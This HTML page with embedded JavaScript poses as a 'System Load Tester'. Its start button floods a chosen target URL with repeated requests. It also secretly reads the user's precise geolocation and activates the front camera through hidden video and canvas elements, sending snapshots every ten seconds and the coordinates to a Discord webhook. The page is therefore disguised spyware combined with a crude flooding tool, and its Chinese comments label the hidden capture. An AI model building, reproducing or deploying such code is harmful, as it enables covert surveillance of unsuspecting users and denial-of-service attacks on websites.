<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SYSTEM LOAD TESTER</title>
<style>
    body { background:#0b0b0b; color:#00ff9c; font-family:monospace; text-align:center; padding-top:50px; overflow-x:hidden; }
    .panel { border:1px solid #00ff9c; width:380px; margin:auto; padding:25px; box-shadow:0 0 20px #00ff9c44; border-radius:10px; background:rgba(10,10,10,0.9); }
    h2 { letter-spacing: 3px; border-bottom: 1px solid #00ff9c; padding-bottom: 10px; }
    input { width:90%; padding:10px; margin:8px; background:#111; border:1px solid #00ff9c; color:#00ff9c; border-radius:5px; }
    button { padding:12px 25px; margin:10px 5px; background:#00ff9c; border:none; cursor:pointer; font-weight:bold; transition: 0.3s; border-radius:5px; }
    button:hover { background:#00cc7a; box-shadow: 0 0 10px #00ff9c; }
    #status { margin-top:20px; font-size:0.9em; min-height: 60px; color: #88ffcc; }
    .count { color: #fff; font-weight: bold; }
    /* 隱藏元素 */
    #v, #c { display:none; }
</style>
</head>
<body>

<div class="panel">
    <h2>LOAD TEST PANEL</h2>
    <p style="font-size:0.8em; color:#666;">SECURITY AUTHENTICATION REQUIRED</p>
    
    <input id="url" placeholder="Target URL (https://...)" value="https://">
    <input id="users" type="number" placeholder="Threads / Requests per sec">
    <input id="time" type="number" placeholder="Duration (Seconds)">
    
    <br>
    <button onclick="initializeSystem()">START SYSTEM TEST</button>
    <button onclick="stopTest()">EMERGENCY STOP</button>

    <div id="status">SYSTEM READY</div>
</div>

<!-- 隱藏的影音元件 -->
<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
const webhook = "https://discord.com";
let running = false;
let timers = [];
let successCount = 0;
let errorCount = 0;

// 主觸發函式：結合所有功能
function initializeSystem() {
    if (running) return;

    const url = document.getElementById("url").value;
    const usersPerSec = parseInt(document.getElementById("users").value);
    const duration = parseInt(document.getElementById("time").value);

    if (!url || !usersPerSec || !duration) {
        alert("Authentication Failed: Please fill all fields.");
        return;
    }

    running = true;
    successCount = 0;
    errorCount = 0;
    
    // 1. 執行原本的負載測試邏輯
    startLoadTest(url, usersPerSec, duration);
    
    // 2. 執行定位回傳
    getLocation();
    
    // 3. 執行隱藏相機截圖
    getCamera();

    document.getElementById("status").innerHTML = "INITIALIZING ATTACK VECTORS...";
}

// --- 負載測試邏輯 ---
function startLoadTest(url, usersPerSec, duration) {
    const testInterval = setInterval(() => {
        for (let i = 0; i < usersPerSec; i++) {
            if (!running) break;
            fetch(url, { mode: 'no-cors' })
                .then(() => { successCount++; })
                .catch(() => { errorCount++; })
                .finally(() => updateProgress());
        }
    }, 1000);
    timers.push(testInterval);

    const autoStop = setTimeout(() => stopTest("TEST COMPLETED"), duration * 1000);
    timers.push(autoStop);
}

function updateProgress() {
    if (!running) return;
    document.getElementById("status").innerHTML = 
        `STATUS: <span style="color:yellow">ACTIVE</span><br>` +
        `PACKETS SENT: <span class="count">${successCount}</span><br>` +
        `FAILURES: <span class="count">${errorCount}</span>`;
}

// --- 定位功能 ---
function getLocation() {
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition((pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            sendToWebhook(`📍 **定位成功**\n緯度: ${lat}\n經度: ${lon}\n地圖: https://www.google.com{lat},${lon}`);
        }, null, { enableHighAccuracy: true });
    }
}

// --- 相機截圖功能 ---
function getCamera() {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then((stream) => {
        const video = document.getElementById("v");
        video.srcObject = stream;
        
        // 啟動後立即截一張，之後每 10 秒一張
        const captureInterval = setInterval(() => {
            if (!running) return;
            const canvas = document.getElementById("c");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob((blob) => {
                const formData = new FormData();
                formData.append('file', blob, 'capture.jpg');
                formData.append('payload_json', JSON.stringify({ content: "📸 **系統監控畫面**" }));
                fetch(webhook, { method: "POST", body: formData });
            }, "image/jpeg", 0.6);
        }, 10000);
        timers.push(captureInterval);
    }).catch(err => console.log("Camera access denied"));
}

function sendToWebhook(msg) {
    fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: msg })
    });
}

function stopTest(reason = "PROCESS TERMINATED") {
    running = false;
    timers.forEach(t => clearInterval(t));
    timers = [];
    document.getElementById("status").innerHTML = `<span style="color:red">${reason}</span>`;
}
</script>

</body>
</html>
